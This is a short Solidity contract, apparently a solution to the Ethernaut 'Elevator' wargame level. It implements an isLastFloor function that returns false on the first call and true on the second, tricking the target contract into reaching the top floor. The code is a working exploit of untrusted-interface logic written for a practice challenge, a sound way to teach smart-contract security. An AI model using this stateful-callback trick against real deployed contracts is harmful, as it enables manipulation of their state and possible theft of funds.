// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorHack {
  Elevator public targetContract;
  bool private called;
  constructor(address _targetContract) {
    targetContract = Elevator(payable(address(_targetContract)));
    called = false;
  }

  function attack() public {
    targetContract.goTo(1e18);
  }

  //NOTE: You can use the view function modifier on an interface in
  // order to prevent state modifications.
  // The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

  // Just going to return what we need when it is called,
  // Can also abuse this by sending emty data of differrent length
  // to determine what to do if calling yourself
  //  0x00 vs 0x0000 can trigger diff response
  function isLastFloor(uint _floor) public returns (bool) {
    if(!called) {
      called = true;
      return false;
    } else {
      return called;
    }
  }

}